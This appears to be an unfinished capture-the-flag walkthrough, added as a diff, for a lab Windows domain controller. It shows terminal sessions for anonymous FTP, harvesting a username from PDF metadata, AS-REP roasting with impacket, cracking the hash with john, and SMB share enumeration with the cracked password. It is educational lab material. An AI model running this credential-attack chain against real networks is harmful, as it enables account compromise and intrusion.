@@ -1,0 +1,124 @@
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# ftp 10.10.10.240                                                                                            
+Connected to 10.10.10.240.
+220 Microsoft FTP Service
+Name (10.10.10.240:kali): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password: 
+230 User logged in.
+Remote system type is Windows_NT.
+ftp> dir
+229 Entering Extended Passive Mode (|||49765|)
+125 Data connection already open; Transfer starting.
+02-19-21  03:06PM               103106 10.1.1.414.6453.pdf
+02-19-21  03:06PM               656029 28475-linux-stack-based-buffer-overflows.pdf
+02-19-21  12:55PM              1802642 BHUSA09-McDonald-WindowsHeap-PAPER.pdf
+02-19-21  03:06PM              1018160 ExploitingSoftware-Ch07.pdf
+08-08-20  01:18PM               219091 notes1.pdf
+08-08-20  01:34PM               279445 notes2.pdf
+08-08-20  01:41PM                  105 README.txt
+02-19-21  03:06PM              1301120 RHUL-MA-2009-06.pdf
+226 Transfer complete.
+ftp> more README.txt
+VERY IMPORTANT!!
+Don't forget to change the download mode to binary so that the files are not corrupted.
+ftp> 
+
+
+all files can be retrieved with
+
+┌──(root㉿kali)-[/home/kali]
+└─# wget -m ftp://anonymous:x@10.10.10.240  
+
+┌──(root㉿kali)-[/home/kali/10.10.10.240]
+└─# exiftool *.pdf        
+
+Creator                         : Kaorz
+Publisher                       : LicorDeBellota.htb
+
+┌──(root㉿kali)-[/home/kali/10.10.10.240]
+└─# impacket-GetNPUsers LICORDEBELLOTA.HTB/Kaorz -dc-ip 10.10.10.240 -no-pass
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Getting TGT for Kaorz
+$krb5asrep$23$Kaorz@LICORDEBELLOTA.HTB:147eea64287dedda31ce09b3594cc0aa$0b68434a34ad4770103c2c2c24964eb6d84f84fcc963b5c649da399831880aa44b185ac658a4bc1d8c2e8f84a52f105e908b1eacd2576e6153a297178beabef72586d4c5b53507450608a2a991ec6fc77d6cb62881de26c40804c2d6d0c77ce1faddc6b23589971702b24a52561881f81047677b1c643c91eeed1d321a2516e81788a9360068f571b843e637d19766a77e352bee318174358080d9adf11fe3e271744db616d04ac35fca73af5f17421962fb652f6c5131044657435a281ac72e0a8a091a0ed57d18e04d10f13ecaed35d8a7a0e6f274620f177896e1a536b182c651b64905d2eb15d9f6e1702ffb490942e0faf6d7a7bb3d
+
+
+┌──(root㉿kali)-[/home/kali/10.10.10.240]
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Roper4155        ($krb5asrep$23$Kaorz@LICORDEBELLOTA.HTB)     
+1g 0:00:00:07 DONE (2025-10-14 04:00) 0.1369g/s 1461Kp/s 1461Kc/s 1461KC/s Rosesmlg1..Ronald8
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+
+┌──(root㉿kali)-[/home/kali/10.10.10.240]
+└─# smbclient -L //10.10.10.240/ -U kaorz%Roper4155
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Admin remota
+	C$              Disk      Recurso predeterminado
+	IPC$            IPC       IPC remota
+	NETLOGON        Disk      Recurso compartido del servidor de inicio de sesión 
+	SYSVOL          Disk      Recurso compartido del servidor de inicio de sesión 
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.10.10.240 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+
+
+┌──(root㉿kali)-[/home/kali/10.10.10.240]
+└─# smbclient //10.10.10.240/NETLOGON -U kaorz%Roper4155
+Try "help" to get a list of possible commands.
+smb: \> recurse ON
+smb: \> ls
+  .                                   D        0  Sat Aug  8 06:42:28 2020
+  ..                                  D        0  Sat Aug  8 06:42:28 2020
+  HelpDesk                            D        0  Sun Aug  9 11:40:36 2020
+
+\HelpDesk
+  .                                   D        0  Sun Aug  9 11:40:36 2020
+  ..                                  D        0  Sun Aug  9 11:40:36 2020
+  Restart-OracleService.exe           A  1854976  Fri Feb 19 05:52:01 2021
+  Server MSSQL.msg                    A    24576  Sun Aug  9 07:04:14 2020
+  WinRM Service.msg                   A    26112  Sun Aug  9 07:42:20 2020
+
+		5158399 blocks of size 4096. 1087206 blocks available
+smb: \> 
+
+
+these are OLE2, we convert online to pdf
+
+"Due to the problems caused by the Oracle database installed in 2010 in Windows, it has been decided to migrate to MSSQL at the
+beginning of 2020.
+Remember that there were problems at the time of restarting the Oracle service and for this reason a program called "Reset-
+Service.exe" was created to log in to Oracle and restart the service"
+
+"After the last pentest, we have decided to stop externally displaying WinRM's service. Several of our employees are
+the creators of Evil-WinRM so we do not want to expose this service... We have created a rule to block the exposure of the service.
+Greetings,"
+
+and we got cybervaca@licordebellota.htb
+
+Moving on to the RestartOracle-Service.exe file on a Windows host we start analysing what the
+executable can do. When running the executable though through the command line it seems like it does not
+run or it runs something hidden.
+Downloading the tool ProcMon64 from SysInternals and monitoring the process reveals that the executable
+indeed creates a temp file in C:\Users\Matt\AppData\Local\Temp 
+
+
+
+
+
+
+
+
+
+
